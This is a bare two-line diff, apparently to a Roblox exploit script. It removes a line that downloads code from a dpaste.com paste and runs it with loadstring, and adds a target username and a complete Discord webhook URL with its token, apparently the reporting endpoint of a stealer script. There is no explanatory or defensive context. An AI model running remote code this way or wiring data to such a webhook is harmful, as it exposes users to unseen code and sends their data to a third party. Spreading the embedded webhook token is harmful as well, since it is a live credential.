@@ -1,1 +1,2 @@
-loadstring(game:HttpGet('https://dpaste.com/CA45W6FWZ.txt'))()
+Username = "Cyan_viloria"
+Webhook = "https://discord.com/api/webhooks/1370424529922556054/bUHAirvxMNwu_6r_Jn6iqUJ56LUkZavPX6Xu33dbulvCzb3gCRHcVUkyd1y4xnuaZrTo"
